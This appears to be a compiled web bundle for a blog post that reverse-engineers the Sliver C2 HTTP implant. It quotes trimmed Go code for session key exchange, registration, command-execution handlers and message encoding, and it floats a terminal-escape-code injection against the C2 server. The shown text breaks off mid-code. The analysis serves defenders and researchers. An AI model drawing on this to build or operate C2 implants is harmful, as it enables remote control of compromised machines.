import{N as ys,b as ns,aB as ls,h as x,O as q,e as j,q as K,ai as Es,aj as J,a1 as H,i as T,ak as os,d as N,g as ds,aC as O,a8 as ps,W as Ds,M as Q,aD as L,aE as Z,aF as z,aG as us,a7 as hs,aH as fs,Q as es,J as ts,I as Cs,a4 as ms,aI as bs,aw as gs,ad as X,aJ as Bs,a0 as rs,Y as vs,a5 as As,a3 as ws,y as a,f as b,n as S}from"./DCFcRc6v.js";import{b as ss,e as xs,a as g,t as B}from"./Dwf-VV-B.js";import"./D4n077k-.js";function ua(e,s){return s}function ks(e,s,l,o){for(var p=[],t=s.length,r=0;r<t;r++)us(s[r].e,p,!0);var c=t>0&&p.length===0&&l!==null;if(c){var y=l.parentNode;hs(y),y.append(l),o.clear(),_(e,s[0].prev,s[t-1].next)}fs(p,()=>{for(var u=0;u<t;u++){var E=s[u];c||(o.delete(E.k),_(e,E.prev,E.next)),es(E.e,!c)}})}function ha(e,s,l,o,p,t=null){var r=e,c={flags:s,items:new Map,first:null},y=(s&ls)!==0;if(y){var u=e;r=x?q(ts(u)):u.appendChild(ys())}x&&j();var E=null,f=!1,F=Cs(()=>{var D=l();return vs(D)?D:D==null?[]:ps(D)});ns(()=>{var D=K(F),i=D.length;if(f&&i===0)return;f=i===0;let A=!1;if(x){var m=r.data===Es;m!==(i===0)&&(r=J(),q(r),H(!1),A=!0)}if(x){for(var v=null,w,C=0;C<i;C++){if(T.nodeType===8&&T.data===ms){r=T,A=!0,H(!1);break}var d=D[C],h=o(d,C);w=cs(T,c,v,null,d,h,C,p,s,l),c.items.set(h,w),v=w}i>0&&q(J())}x||_s(D,c,r,p,s,o,l),t!==null&&(i===0?E?os(E):E=N(()=>t(r)):E!==null&&ds(E,()=>{E=null})),A&&H(!0),K(F)}),x&&(r=T)}function _s(e,s,l,o,p,t,r){var U,$,G,V;var c=(p&bs)!==0,y=(p&(L|z))!==0,u=e.length,E=s.items,f=s.first,F=f,D,i=null,A,m=[],v=[],w,C,d,h;if(c)for(h=0;h<u;h+=1)w=e[h],C=t(w,h),d=E.get(C),d!==void 0&&((U=d.a)==null||U.measure(),(A??(A=new Set)).add(d));for(h=0;h<u;h+=1){if(w=e[h],C=t(w,h),d=E.get(C),d===void 0){var Fs=F?F.e.nodes_start:l;i=cs(Fs,s,i,i===null?s.first:i.next,w,C,h,o,p,r),E.set(C,i),m=[],v=[],F=i.next;continue}if(y&&Ss(d,w,h,p),d.e.f&O&&(os(d.e),c&&(($=d.a)==null||$.unfix(),(A??(A=new Set)).delete(d))),d!==F){if(D!==void 0&&D.has(d)){if(m.length<v.length){var I=v[0],k;i=I.prev;var W=m[0],M=m[m.length-1];for(k=0;k<m.length;k+=1)as(m[k],I,l);for(k=0;k<v.length;k+=1)D.delete(v[k]);_(s,W.prev,M.next),_(s,i,W),_(s,M,I),F=I,i=M,h-=1,m=[],v=[]}else D.delete(d),as(d,F,l),_(s,d.prev,d.next),_(s,d,i===null?s.first:i.next),_(s,i,d),i=d;continue}for(m=[],v=[];F!==null&&F.k!==C;)F.e.f&O||(D??(D=new Set)).add(F),v.push(F),F=F.next;if(F===null)continue;d=F}m.push(d),i=d,F=d.next}if(F!==null||D!==void 0){for(var P=D===void 0?[]:ps(D);F!==null;)F.e.f&O||P.push(F),F=F.next;var R=P.length;if(R>0){var is=p&ls&&u===0?l:null;if(c){for(h=0;h<R;h+=1)(G=P[h].a)==null||G.measure();for(h=0;h<R;h+=1)(V=P[h].a)==null||V.fix()}ks(s,P,is,E)}}c&&Ds(()=>{var Y;if(A!==void 0)for(d of A)(Y=d.a)==null||Y.apply()}),Q.first=s.first&&s.first.e,Q.last=i&&i.e}function Ss(e,s,l,o){o&L&&Z(e.v,s),o&z?Z(e.i,l):e.i=l}function cs(e,s,l,o,p,t,r,c,y,u){var E=(y&L)!==0,f=(y&Bs)===0,F=E?f?gs(p):X(p):p,D=y&z?X(r):r,i={i:D,v:F,k:t,a:null,e:null,prev:l,next:o};try{return i.e=N(()=>c(e,F,D,u),x),i.e.prev=l&&l.e,i.e.next=o&&o.e,l===null?s.first=i:(l.next=i,l.e.next=i.e),o!==null&&(o.prev=i,o.e.prev=i.e),i}finally{}}function as(e,s,l){for(var o=e.next?e.next.e.nodes_start:l,p=s?s.e.nodes_start:l,t=e.e.nodes_start;t!==o;){var r=rs(t);p.before(t),t=r}}function _(e,s,l){s===null?e.first=l:(s.next=l,s.e.next=l&&l.e),l!==null&&(l.prev=s,l.e.prev=s&&s.e)}function n(e,s,l,o,p){var t=e,r="",c;ns(()=>{if(r===(r=s()??"")){x&&j();return}c!==void 0&&(es(c),c=void 0),r!==""&&(c=N(()=>{if(x){T.data;for(var y=j(),u=y;y!==null&&(y.nodeType!==8||y.data!=="");)u=y,y=rs(y);if(y===null)throw As(),ws;ss(T,u),t=q(y);return}var E=r+"",f=xs(E);ss(ts(f),f.lastChild),t.before(f)}))})}const Ts={title:"Analysis of the Sliver C2 HTTP Implant",date:"2025-03-02T01:00:00",description:"Unpacking the sliver1.6 c2 http implant to document how it works and the traffic it sends",categories:["sliver","c2","reversing"]};var Ps=B('<h2>Summary</h2> <p>In this article I want to take apart the sliver http implant with the following objectives:</p> <ul><li>Document the communication between the sliver server and an implant</li> <li>Explain how a sliver is handling requests from the sliver server</li> <li>Look at the encoding of messages across the connection</li></ul> <p>To do that we are going to look at how a connection is established and maintained by the implant.</p> <h2>Analysis</h2> <h3>Establishing a Connection</h3> <p>The first thing we need to understand the way sliver implants establish a secure channel with the server.</p> <p>All silver code (silvers are implants and beacons) is located in the <code>sliver/implant/sliver</code> directory. Sliver’s code uses a lot of abstraction as all types of connections (http(s), dns, mtls, etc..) use the same boilerplate. Let’s break down the connection establishing code for an http connection. While we could skip to the relevant functions, I think it is important to understand how functions are interacting with each other and passing objects in the implants.</p> <p>First we check out the <code>sliver.go</code> file and the main function. The important code here tells us that if the sliver is considered an implant we run <code>sessionStartup()</code>.</p> <!> <p><code>SessionStartup()</code> is using transports (a sliver library) to start a connection loop. It is then starting a Main Loop on the connection. We will come back to the main loop later.</p> <!> <p>This takes us to the <code>StartConnectionLoop()</code> function. This section is simply creating an http connection using a uri that is generated by the configuration settings of the implant.</p> <!> <p>This httpConnect function is then calling <code>httpclient.HTTPStartSession()</code>. Note this is attaching the initialization to the connection.Start function, not actually running it (yet).</p> <!> <p>So we finally get to the http client specific code. The <code>HTTPStartSession()</code> code does some stuff and then calls the <code>client.SessionInit()</code>.</p> <!> <p>Finally, we get to the initialization code. This function is incredibly interesting. It creates the symmetric key that will be used to encrypt the session. There also appear to be Age keys in the implant config, which are asymmetric and handle initializing the handshake: <a href="https://github.com/FiloSottile/age" rel="nofollow">https://github.com/FiloSottile/age</a>. I have added some comments about what this function is doing.</p> <!> <p>The <code>establishSessionID()</code> function is taking our encrypted session key and creating a request with an encoder (such as gzip, json, etc…). I have stripped all the error checking and debug so we can look at the meat of what this function is doing.</p> <!> <p>At this point a connection has been established and the sliver/implant is communicating with the server.</p> <h3>Implant Main Loop</h3> <p>Now we get to the main loop which we mentioned previously. I again have stripped some of the error code to focus on the program flow that we care about for our http implant.</p> <!> <p>There are three interesting things going on here. First, we are registering a sliver. That function is below. What is interesting here, is that the registration is actually displayed upon connection to a sliver server. Modifying the hostname to use terminal escape codes actually can render the server useless (DoS clear screen) or potentially get an RCE such as <a href="https://www.gresearch.com/news/g-research-the-terminal-escapes/" rel="nofollow">https://www.gresearch.com/news/g-research-the-terminal-escapes/</a>. This is something to bear in mind, if a defender is willing to reverse engineer your beacons, they could make your life miserable.</p> <!> <p>Second, the handler functions are quite interesting. These are the functions/objects that control what actually goes on. Take for instance the sysHandlers. (In certain cases) That is a generic handler like below.</p> <!> <p>As in the main loop, when we want to execute a command we would request the <code>sliverpb.MsgExecuteReq</code> which would let use access the underlying system through the following function. This function is taking a command protobuf object and executing it.</p> <!> <p>Third, we have to remember that the send function is actually a channel that is created when we initialize a session. So in httpConnect() we are spinning up a go subroutine which is handling all information that is sent.</p> <!> <p>WriteEnvelope (ReadEnvelope is a polling feature GetRequest (which all our data comes from)) looks like the following and is encoding the message and shipping it to the server.</p> <!> <h3>Implant Generation</h3> <p>Implant Generation is relatively simple. I use the following command to generate implants on my server instance. Please see my other post (or the sliver docs) about setting up a server.</p> <!>',1);function Is(e){var s=Ps(),l=a(b(s),18);n(l,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/sliver.go</span></span>
<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> main</span><span style="color:#E6EDF3">() &#123;</span></span>
<span class="line"><span style="color:#FF7B72">    ...</span></span>
<span class="line"><span style="color:#8B949E">	// &#123;&#123;if .Config.IsBeacon&#125;&#125;</span></span>
<span class="line"><span style="color:#D2A8FF">	beaconStartup</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#8B949E">	// &#123;&#123;else&#125;&#125; ------- IsBeacon/IsSession -------</span></span>
<span class="line"><span style="color:#D2A8FF">	sessionStartup</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#8B949E">	// &#123;&#123;end&#125;&#125;</span></span>
<span class="line"><span style="color:#FF7B72">    ...</span></span>
<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre>`);var o=a(l,4);n(o,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/sliver.go</span></span>
<span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> (</span></span>
<span class="line"><span style="color:#A5D6FF">    "</span><span style="color:#FFA657">github.com/bishopfox/sliver/implant/sliver/transports</span><span style="color:#A5D6FF">"</span></span>
<span class="line"><span style="color:#E6EDF3">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> sessionStartup</span><span style="color:#E6EDF3">() &#123;</span></span>
<span class="line"><span style="color:#FF7B72">    ...</span></span>
<span class="line"><span style="color:#E6EDF3">    connections </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> transports.</span><span style="color:#D2A8FF">StartConnectionLoop</span><span style="color:#E6EDF3">(abort)</span></span>
<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> connection </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> range</span><span style="color:#E6EDF3"> connections &#123;</span></span>
<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> connection </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> nil</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">			err </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> sessionMainLoop</span><span style="color:#E6EDF3">(connection)</span></span>
<span class="line"><span style="color:#FF7B72">    ...</span></span>
<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre>`);var p=a(o,4);n(p,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/transports/session.go</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> StartConnectionLoop</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">abort</span><span style="color:#FF7B72"> &#x3C;-chan</span><span style="color:#FF7B72"> struct</span><span style="color:#E6EDF3">&#123;&#125;, </span><span style="color:#FFA657">temporaryC2</span><span style="color:#FF7B72"> ...</span><span style="color:#FF7B72">string</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">&#x3C;-chan</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">Connection</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	c2Generator </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> C2Generator</span><span style="color:#E6EDF3">(innerAbort, temporaryC2</span><span style="color:#FF7B72">...</span><span style="color:#E6EDF3">) </span><span style="color:#8B949E">// the generator simply returns a uri that can be used to connect to a server</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#FF7B72">	for</span><span style="color:#E6EDF3"> uri </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> range</span><span style="color:#E6EDF3"> c2Generator &#123;</span></span>
<span class="line"><span style="color:#FF7B72">			var</span><span style="color:#E6EDF3"> err </span><span style="color:#FF7B72">error</span></span>
<span class="line"><span style="color:#FF7B72">    ...</span></span>
<span class="line"><span style="color:#FF7B72">			case</span><span style="color:#A5D6FF"> "http"</span><span style="color:#E6EDF3">:</span></span>
<span class="line"><span style="color:#8B949E">				// *** HTTP ***</span></span>
<span class="line"><span style="color:#8B949E">				// &#123;&#123;if .Config.IncludeHTTP&#125;&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">				connection, err </span><span style="color:#FF7B72">=</span><span style="color:#D2A8FF"> httpConnect</span><span style="color:#E6EDF3">(uri)</span></span>
<span class="line"><span style="color:#FF7B72">				if</span><span style="color:#E6EDF3"> err </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> nil</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#8B949E">					// &#123;&#123;if .Config.Debug&#125;&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">					log.</span><span style="color:#D2A8FF">Printf</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"[</span><span style="color:#FF7B72">%s</span><span style="color:#A5D6FF">] Connection failed </span><span style="color:#FF7B72">%s</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">, uri.Scheme, err)</span></span>
<span class="line"><span style="color:#8B949E">					// &#123;&#123;end&#125;&#125;</span></span>
<span class="line"><span style="color:#FF7B72">					continue</span></span>
<span class="line"><span style="color:#E6EDF3">				&#125;</span></span>
<span class="line"><span style="color:#8B949E">				// &#123;&#123;end&#125;&#125; - IncludeHTTP</span></span>
<span class="line"><span style="color:#FF7B72">    ...</span></span>
<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre>`);var t=a(p,4);n(t,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/transports/session.go</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> httpConnect</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">uri</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">url</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">URL</span><span style="color:#E6EDF3">) (</span><span style="color:#FF7B72">*</span><span style="color:#FFA657">Connection</span><span style="color:#E6EDF3">, </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3">) &#123;</span></span>
<span class="line"><span style="color:#FF7B72">    ...</span></span>
<span class="line"><span style="color:#E6EDF3">	connection.Start </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> func</span><span style="color:#E6EDF3">() </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#8B949E">		// &#123;&#123;if .Config.Debug&#125;&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">		log.</span><span style="color:#D2A8FF">Printf</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"Connecting -> http(s)://</span><span style="color:#FF7B72">%s</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">, uri.Host)</span></span>
<span class="line"><span style="color:#8B949E">		// &#123;&#123;end&#125;&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">		opts </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> httpclient.</span><span style="color:#D2A8FF">ParseHTTPOptions</span><span style="color:#E6EDF3">(uri)</span></span>
<span class="line"><span style="color:#E6EDF3">		client, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> httpclient.</span><span style="color:#D2A8FF">HTTPStartSession</span><span style="color:#E6EDF3">(uri.Host, uri.Path, opts)</span></span>
<span class="line"><span style="color:#FF7B72">    ...</span></span></code></pre>`);var r=a(t,4);n(r,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/transports/httpclient/httpclient.go</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> HTTPStartSession</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">address</span><span style="color:#FF7B72"> string</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">pathPrefix</span><span style="color:#FF7B72"> string</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">opts</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">HTTPOptions</span><span style="color:#E6EDF3">) (</span><span style="color:#FF7B72">*</span><span style="color:#FFA657">SliverHTTPClient</span><span style="color:#E6EDF3">, </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3">) &#123;</span></span>
<span class="line"><span style="color:#FF7B72">    ...</span></span>
<span class="line"><span style="color:#E6EDF3">    err </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> client.</span><span style="color:#D2A8FF">SessionInit</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#FF7B72">    ...</span></span>
<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre>`);var c=a(r,4);n(c,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/transports/httpclient/httpclient.go</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">func</span><span style="color:#E6EDF3"> (</span><span style="color:#FFA657">s </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">SliverHTTPClient</span><span style="color:#E6EDF3">) </span><span style="color:#D2A8FF">SessionInit</span><span style="color:#E6EDF3">() </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">	sKey </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> cryptography.</span><span style="color:#D2A8FF">RandomSymmetricKey</span><span style="color:#E6EDF3">() </span><span style="color:#8B949E">// create a random Symmetric Key</span></span>
<span class="line"><span style="color:#E6EDF3">	s.SessionCtx </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> cryptography.</span><span style="color:#D2A8FF">NewCipherContext</span><span style="color:#E6EDF3">(sKey)  </span><span style="color:#8B949E">// set the key for the context of the implant</span></span>
<span class="line"><span style="color:#E6EDF3">	httpSessionInit </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">pb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">HTTPSessionInit</span><span style="color:#E6EDF3">&#123;Key: sKey[:]&#125; </span></span>
<span class="line"><span style="color:#E6EDF3">	data, _ </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> proto.</span><span style="color:#D2A8FF">Marshal</span><span style="color:#E6EDF3">(httpSessionInit)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E6EDF3">	encryptedSessionInit, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> cryptography.</span><span style="color:#D2A8FF">AgeKeyExToServer</span><span style="color:#E6EDF3">(data)   </span><span style="color:#8B949E">// encrypt the symmetric key with the server's public age key</span></span>
<span class="line"><span style="color:#FF7B72">	if</span><span style="color:#E6EDF3"> err </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> nil</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#8B949E">		// &#123;&#123;if .Config.Debug&#125;&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">		log.</span><span style="color:#D2A8FF">Printf</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"Nacl encrypt failed </span><span style="color:#FF7B72">%v</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">, err)</span></span>
<span class="line"><span style="color:#8B949E">		// &#123;&#123;end&#125;&#125;</span></span>
<span class="line"><span style="color:#FF7B72">		return</span><span style="color:#E6EDF3"> err</span></span>
<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">	err </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> s.</span><span style="color:#D2A8FF">establishSessionID</span><span style="color:#E6EDF3">(encryptedSessionInit) </span><span style="color:#8B949E">// establish a session with this encrypted key</span></span>
<span class="line"><span style="color:#FF7B72">	if</span><span style="color:#E6EDF3"> err </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> nil</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#FF7B72">		return</span><span style="color:#E6EDF3"> err</span></span>
<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
<span class="line"><span style="color:#FF7B72">	return</span><span style="color:#79C0FF"> nil</span></span>
<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre>`);var y=a(c,4);n(y,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// sliver/implant/sliver/transports/httpclient/httpclient.go</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">func</span><span style="color:#E6EDF3"> (</span><span style="color:#FFA657">s </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">SliverHTTPClient</span><span style="color:#E6EDF3">) </span><span style="color:#D2A8FF">establishSessionID</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">sessionInit</span><span style="color:#E6EDF3"> []</span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">	nonce, encoder </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> encoders.</span><span style="color:#D2A8FF">RandomEncoder</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#E6EDF3">	payload, _ </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> encoder.</span><span style="color:#D2A8FF">Encode</span><span style="color:#E6EDF3">(sessionInit)</span></span>
<span class="line"><span style="color:#E6EDF3">	reqBody </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> bytes.</span><span style="color:#D2A8FF">NewReader</span><span style="color:#E6EDF3">(payload)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E6EDF3">	uri </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.</span><span style="color:#D2A8FF">startSessionURL</span><span style="color:#E6EDF3">() </span><span style="color:#8B949E">//get the url that starts a session, this is specific and server will reject otherwise</span></span>
<span class="line"><span style="color:#E6EDF3">	s.</span><span style="color:#D2A8FF">NonceQueryArgument</span><span style="color:#E6EDF3">(uri, nonce) </span><span style="color:#8B949E">//add a nonce to the url to prevent duplicate request attacks</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E6EDF3">	req </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.</span><span style="color:#D2A8FF">newHTTPRequest</span><span style="color:#E6EDF3">(http.MethodPost, uri, reqBody) </span><span style="color:#8B949E">//create a request</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	resp, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.driver.</span><span style="color:#D2A8FF">Do</span><span style="color:#E6EDF3">(req) </span><span style="color:#8B949E">// send the request</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	respData, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> io.</span><span style="color:#D2A8FF">ReadAll</span><span style="color:#E6EDF3">(resp.Body) </span><span style="color:#8B949E">//get the response</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	data, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> encoder.</span><span style="color:#D2A8FF">Decode</span><span style="color:#E6EDF3">(respData) </span><span style="color:#8B949E">//decode the response</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	sessionID, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.SessionCtx.</span><span style="color:#D2A8FF">Decrypt</span><span style="color:#E6EDF3">(data) </span><span style="color:#8B949E">//decrypt the decoding</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	s.SessionID </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> string</span><span style="color:#E6EDF3">(sessionID) </span><span style="color:#8B949E">//set our session id</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#FF7B72">	return</span><span style="color:#79C0FF"> nil</span></span>
<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre>`);var u=a(y,8);n(u,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">//implant/sliver/sliver.go</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> sessionMainLoop</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">connection</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">transports</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Connection</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#8B949E">	//ideally a malicious plugin would request information necessary to mimic a legitimate plugin here</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> connection.</span><span style="color:#D2A8FF">Start</span><span style="color:#E6EDF3">() </span><span style="color:#8B949E">// this is preforming the session id establishing that is covered in the above section</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#FF7B72">	defer</span><span style="color:#E6EDF3"> connection.</span><span style="color:#D2A8FF">Stop</span><span style="color:#E6EDF3">() </span><span style="color:#8B949E">//stop the connection when we are done</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E6EDF3">	register </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> registerSliver</span><span style="color:#E6EDF3">() </span><span style="color:#8B949E">//get registration information</span></span>
<span class="line"><span style="color:#E6EDF3">	register.ActiveC2 </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> connection.</span><span style="color:#D2A8FF">URL</span><span style="color:#E6EDF3">() </span></span>
<span class="line"><span style="color:#E6EDF3">	register.ProxyURL </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> connection.</span><span style="color:#D2A8FF">ProxyURL</span><span style="color:#E6EDF3">() </span></span>
<span class="line"><span style="color:#E6EDF3">	connection.Send </span><span style="color:#FF7B72">&#x3C;-</span><span style="color:#D2A8FF"> wrapEnvelope</span><span style="color:#E6EDF3">(sliverpb.MsgRegister, register) </span><span style="color:#8B949E">// Send registration information</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E6EDF3">	pivotHandlers </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> handlers.</span><span style="color:#D2A8FF">GetPivotHandlers</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#E6EDF3">	tunHandlers </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> handlers.</span><span style="color:#D2A8FF">GetTunnelHandlers</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#E6EDF3">	sysHandlers </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> handlers.</span><span style="color:#D2A8FF">GetSystemHandlers</span><span style="color:#E6EDF3">() </span><span style="color:#8B949E">//handler to execute commands</span></span>
<span class="line"><span style="color:#E6EDF3">	specialHandlers </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> handlers.</span><span style="color:#D2A8FF">GetKillHandlers</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#E6EDF3">	rportfwdHandlers </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> handlers.</span><span style="color:#D2A8FF">GetRportFwdHandlers</span><span style="color:#E6EDF3">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">	for</span><span style="color:#E6EDF3"> envelope </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> range</span><span style="color:#E6EDF3"> connection.Recv &#123; </span><span style="color:#8B949E">//for each message we receive, apply the correct handler</span></span>
<span class="line"><span style="color:#E6EDF3">		envelope </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> envelope</span></span>
<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> _, ok </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> specialHandlers[envelope.Type]; ok &#123;</span></span>
<span class="line"><span style="color:#FF7B72">			...</span></span>
<span class="line"><span style="color:#FF7B72">			return</span><span style="color:#E6EDF3"> ErrTerminate</span></span>
